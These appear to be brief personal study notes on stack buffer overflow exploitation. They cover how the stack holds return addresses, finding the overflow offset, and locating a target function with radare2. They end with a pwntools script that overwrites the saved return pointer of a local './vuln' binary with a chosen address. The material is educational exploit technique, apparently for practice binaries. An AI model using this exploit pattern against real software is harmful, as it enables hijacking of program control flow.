===Stack==
- Region of memory storing temporary variables created by functions in code.
- Function called -> Memory address pushed into stack.

1) Identify minimum Offset/padding 
Padding | Offset/padding to cause segmentation fault
2) Target function/memory address
afl (Command) | Analyse Functions List (List functions of binary). 
      - Identify target function to execute and its memory address.
3) Prepare (Overwrite saved return pointer/address that will popped into EIP) 
Overflow -> Point to target memory address.
) Value to give to EIP

from pwn import *            # pwntools Import

p = process('./vuln')        # Start process

payload = b'A' * 52          # String to bytes because of next line
payload += p32(0x080491c3)   # Target memory address (p32 function returns bytes) - Endianness

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output target string.
